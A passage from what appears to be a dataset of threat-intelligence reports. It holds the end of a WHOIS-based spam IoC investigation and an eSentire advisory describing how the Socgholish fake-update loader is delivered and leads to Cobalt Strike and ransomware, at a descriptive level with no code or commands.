Spamhaus’s list of top spam-sending countries as of 29 September 2022. Next, we performed historical WHOIS searches for the IoCs, which uncovered 18 registrant email addresses. The majority of them (79%) were QQMail (i.e., qq.com) accounts although their owners would be hard to identify given the use of random characters (i.e., letters and numbers) instead of proper names. To further expand the list of potentially related threat artifacts, the IP addresses were used as reverse IP search terms. That led to the discovery of 354 domains. Fortunately, none of them are currently deemed malicious. Several, however, shared similarities with the IoCs, and so warrant closer attention from security teams. These domains include 87 NRDs whose registrant details have been redacted. Even if no organization can escape spam, protecting against outright malicious emails that can lead to financial and reputational damages can still be made more effective by identifying and blocking threats from the source with the aid of WHOIS, DNS, and IP intelligence. If you wish to perform a similar investigation or get access to the full data behind this research, please don’t hesitate to contact us ."
af26c249-ce39-5cb5-bbd1-8e1de7252d72,17-August-2022,Increase in Observations of Socgholish Malware,ESentire has identified a significant increase in Socgholish malware incidents. Socghlish is a loader type malware capable of performing reconnaissance activity and deploying secondary payloads. The malware has been observed leading to the deployment of various types of ransomware.,"Starting in early August 2022 and continuing through the month, eSentire identified a significant increase in Socgholish (aka. FakeUpdates) malware incidents. Socgholish is a loader type malware that is capable of performing reconnaissance activity and deploying secondary payloads including Cobalt Strike. The operators of Socgholish function as initial access brokers; other threat actors can leverage this service to gain entry into victim organizations. Socgholish is a high priority threat as the malware has been observed leading to the deployment of various types of ransomware. The eSentire Threat Intelligence team assesses with high confidence that there is an ongoing Socgholish malware campaign, and the activity will continue in the immediate future. As Socgholish has a history of being used for initial access into victim organizations for other threat actors, prevention and the rapid identification and remediation of the threat is critical. In recently observed incidents, the malware is delivered via drive-by social engineering attacks, where compromised websites redirect end-users to fake software update pages. Fake update pages are generally themed as web browser updates; the attacker-controlled page checks the user’s browser and displays a fake update that corresponds with the specific browser (Figure 1). The malware is delivered as a .zip file containing a script file; user execution of the malicious file is required for successful malware deployment. Socgholish has also been identified being deployed as a secondary payload for other malware. According to a report from Microsoft , the Raspberry Robin worm has been observed deploying Socgholish in recent attacks. Incidents involving Socgholish may progress rapidly. eSentire has observed Socgholish leading to the deployment of the Cobalt Strike red team tool within 10 minutes of the initial compromise occurring (Figure 2). Cobalt Strike allows threat actors to prepare for ransomware deployment by escalating privileges and moving laterally in the victim environment. Recent ransomware payloads, delivered through Socgholish, include LockBit and WastedLocker. Socgholish Reconnaissance Commands: [1] https://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/attack-surface-reduction?view=o365-worldwide#block-javascript-or-vbscript-from-launching-downloaded-executable-content [2] https://www.microsoft.com/security/blog/2022/05/09/ransomware-as-a-service-understanding-the-cybercrime-gig-economy-and-how-to-protect-yourself/#DEV-0206-DEV-0243 [3] https://www.esentire.com/blog/socgholish-to-cobalt-strike-in-10-minutes"
